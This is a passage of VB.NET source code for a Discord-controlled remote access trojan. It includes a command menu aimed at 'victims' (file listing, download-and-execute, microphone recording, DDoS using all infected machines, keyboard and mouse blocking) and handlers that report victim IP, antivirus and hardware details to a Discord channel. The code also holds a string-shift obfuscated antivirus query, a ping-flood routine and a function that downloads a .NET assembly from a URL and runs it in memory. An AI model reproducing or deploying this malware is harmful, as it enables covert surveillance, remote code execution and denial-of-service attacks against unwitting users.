!files [NAME] [PATH] (Getting all files from the given path, example: !files C:\Users\Victim\Desktop\Folder1\ for Victim) 
!download [NAME] [NET/normal] [DIRECTLINK] (Downloading and executing a file from a directlink) 
!updateclient [NAME] [DIRECTLINK] (Might not work because it's still in progress)
!uninstall [NAME] (Uninstalling client)
!record [NAME] [SECONDS] (Recording the victim's microphone for x seconds) 
!ddos [start/stop] [IP] (DDOSing a given IP using all victims) 

FUN Commands:
!monitor [NAME] [ON/OFF] (Turning monitor on or off) 
!block [NAME] [TRUE/FALSE] (Blocking the keyboard + mouse for the victim / or enable it) 
!shutdown [NAME] (Shutting the PC down for the victim) 
!restart [NAME] (Restarting the PC down for the victim)
!logoff [NAME] (Logging the PC off for the victim)
!open [NAME] [LINK] (Open a website for the victim, example: !open http://www.google.com for Victim)
!setwallpaper [NAME] [DIRECTLINK] (Setting a desktop background from directlink)
!volume [NAME] [up/down/mute] (Turning volume up, down or mute it for the victim)
!messagebox [NAME] [TEXT] (Showing a messagebox up for the victim)
!messagevoice [NAME] [TEXT] (Playing a text to speech message for the victim)

*If you notice any bugs or something else, then contact the owner!*```")
                Catch ex As Exception
                End Try
            End If
        End If


        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "RATInfo") Then
                Try
                    Await message.Channel.SendMessageAsync("```" + Environment.NewLine + "'RATInfos'" + Environment.NewLine + "Version: 2.6.2" + Environment.NewLine + "Compatible with: Windows 7 upto 10" + Environment.NewLine + "```")
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "info " + System.Environment.UserName + " " + "general") Then
                Try
                    Dim Ram As String = (CDbl(My.Computer.Info.TotalPhysicalMemory) / 1024 / 1024 / 1024).ToString("##.#GB")
                    Await message.Channel.SendMessageAsync("```Infos:" + Environment.NewLine + "UserName: " + System.Environment.UserName + Environment.NewLine + "OS: " + My.Computer.Info.OSFullName + Environment.NewLine + "OSPlatform: " + My.Computer.Info.OSPlatform + Environment.NewLine + "IP: " + GETIPADRESS() + Environment.NewLine + "AntiVirus: " + GetAVInfo(System.Environment.MachineName) + Environment.NewLine + "RAM: " + Ram + Environment.NewLine + "Time: " + TimeOfDay.ToString("h:mm:ss tt") + Environment.NewLine + "Country: " + Application.CurrentInputLanguage.Culture.DisplayName + Environment.NewLine + "```")
                Catch ex As Exception
                End Try
            ElseIf message.Content.StartsWith(Wake & "info " + System.Environment.UserName + " " + "gpu") Then
                For Each MemObj As ManagementObject In ObjSearcher.Get
                    Await message.Channel.SendMessageAsync("```GPU Infos: " + "Name: " + MemObj("Name") + Environment.NewLine + "MaxRefreshRate: " + Convert.ToUInt64(MemObj("MaxRefreshRate")).ToString + Environment.NewLine + "AdapterRam: " + Convert.ToUInt64(MemObj("AdapterRam")).ToString + Environment.NewLine + "Description: " + MemObj("Description") + Environment.NewLine + "DeviceID: " + MemObj("DeviceID") + Environment.NewLine + "DriverVersion: " + MemObj("DriverVersion") + "```")
                Next
            ElseIf message.Content.StartsWith(Wake & "info " + System.Environment.UserName + " " + "cpu") Then
                For Each MemObj As ManagementObject In ObjSearcher1.Get
                    Await message.Channel.SendMessageAsync("```CPU Infos: " + "Name: " + MemObj("Name") + Environment.NewLine + "DeviceID: " + MemObj("DeviceID") + Environment.NewLine + "CpuStatus: " + Convert.ToUInt16(MemObj("CpuStatus")).ToString + Environment.NewLine + "Description: " + MemObj("Description") + Environment.NewLine + "InstallDate: " + Convert.ToDateTime(MemObj("InstallDate")).ToString + Environment.NewLine + "Version: " + MemObj("Version") + "```")
                Next
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "messagebox " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!messagebox " + System.Environment.UserName, "")
                    Await message.Channel.SendMessageAsync("```Sent message: " + "'" + messageToSend + "'" + "```")
                    MsgBox(messageToSend, MsgBoxStyle.Critical, messageToSend)
                Catch ex As Exception
                End Try
            End If
        End If



        If message.Source <> MessageSource.Bot And message.Content.StartsWith(Wake) Then
            If message.Content.StartsWith(Wake & "messagevoice " + System.Environment.UserName) Then
                Try
                    Dim messageToSend As String = message.Content.Replace("!messagevoice " + System.Environment.UserName, "")
                    Await message.Channel.SendMessageAsync("```Sent voice message: " + "'" + messageToSend + "'" + "```")
                    Dim SAPI
                    SAPI = CreateObject("SAPI.spvoice")
                    SAPI.Speak(messageToSend)
                Catch ex As Exception
                End Try
            End If
        End If
    End Function




    'other stuff
#Region "If form closing"
    Private Sub Form1_FormClosing(ByVal sender As System.Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles MyBase.FormClosing
        Try
            Dim path1 As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cof"
            Dim path2 As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\discord\Local Storage\cop"
            System.IO.Directory.Delete(path1, True)
            System.IO.Directory.Delete(path2, True)
        Catch ex As Exception
        End Try
    End Sub
#End Region

#Region "delay"
    Sub Delay(ByVal dblSecs As Double)
        Const OneSec As Double = 1.0# / (1440.0# * 60.0#)
        Dim dblWaitTil As Date
        Now.AddSeconds(OneSec)
        dblWaitTil = Now.AddSeconds(OneSec).AddSeconds(dblSecs)
        Do Until Now > dblWaitTil
            Application.DoEvents() ' Allow windows messages to be processed
        Loop
    End Sub
#End Region

#Region "other stuff"
    Public Function sub26(s As String, v As Long) As String
        Dim str27 As String
        Dim str28 As String
        For i = 1 To Len(s)
            str28 = Mid(s, i, 1)
            str28 = Asc(str28) + v
            str28 = Chr(str28)
            str27 = str27 & str28
        Next i
        sub26 = str27
    End Function
    Private Function GetAVInfo(ByVal strSystem As String) As String
        Dim strComputer As String = String.Empty
        Dim wmiNS As String = String.Empty
        Dim wmiQuery As String = String.Empty
        Dim objWMIService As Object
        Dim ColItems As Object
        Dim objItem As Object
        Dim strSB As New StringBuilder
        Dim t11 As String = "YollqYpb`rofqv@bkqbo/"
        t11 = sub26(t11, 3)
        Dim t12 As String = "Pbib`q'colj>kqfSforpMolar`q"
        t12 = sub26(t12, 3)
        Dim t13 As String = "tfkjdjqp7YY"
        t13 = sub26(t13, 3)
        Try
            If strSystem = System.Environment.MachineName Then
                strComputer = "."
            Else
                strComputer = strSystem
            End If
            wmiNS = t11
            wmiQuery = t12
            objWMIService = GetObject(t13 & strComputer & wmiNS)
            ColItems = objWMIService.ExecQuery(wmiQuery)
            For Each objItem In ColItems
                Try
                    strSB.AppendLine(objItem.displayname.ToString)

                Catch ex As Exception
                    strSB.AppendLine("??" & vbTab & vbTab & vbTab & "??")

                End Try
            Next

        Catch ex As Exception

        End Try
        Return strSB.ToString

    End Function
#End Region






    Public Sub Attack(Host As String)
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Attck:
            System.Threading.Thread.Sleep(1500)
            Dim aa As New System.Net.NetworkInformation.Ping
            Dim bb As System.Net.NetworkInformation.PingReply
            Dim txtlog As String = ""
            Dim cC As New System.Net.NetworkInformation.PingOptions
            cC.DontFragment = True
            cC.Ttl = 64
            Dim data As String = Randomisi2(300)
            Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
            Dim i As Int16
            For i = 0 To 10000
                bb = aa.Send(Host, 2000, bt, cC)
            Next i
            Resume Attck
        End If
    End Sub

    Public Function Randomisi2(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function





    Public Sub DownloadExecute(ByVal url As String)
        Dim c As New WebClient
        Execute(c.DownloadData(url))
    End Sub

    Public Sub Execute(ByVal bytes As Byte())
        Dim t As New Thread(AddressOf DoExecute)
        t.TrySetApartmentState(ApartmentState.STA)
        t.Start(bytes)
    End Sub

    Public Sub DoExecute(ByVal d As Byte())
        Dim asm As Assembly = Assembly.Load(d)
        Dim entryPoint As MethodInfo = asm.EntryPoint
        Dim o As Object() = Nothing
        If entryPoint.GetParameters().Length > 0 Then
            o = New Object() {New String() {"1"}}
        End If
        entryPoint.Invoke(Nothing, o)
    End Sub
End Class
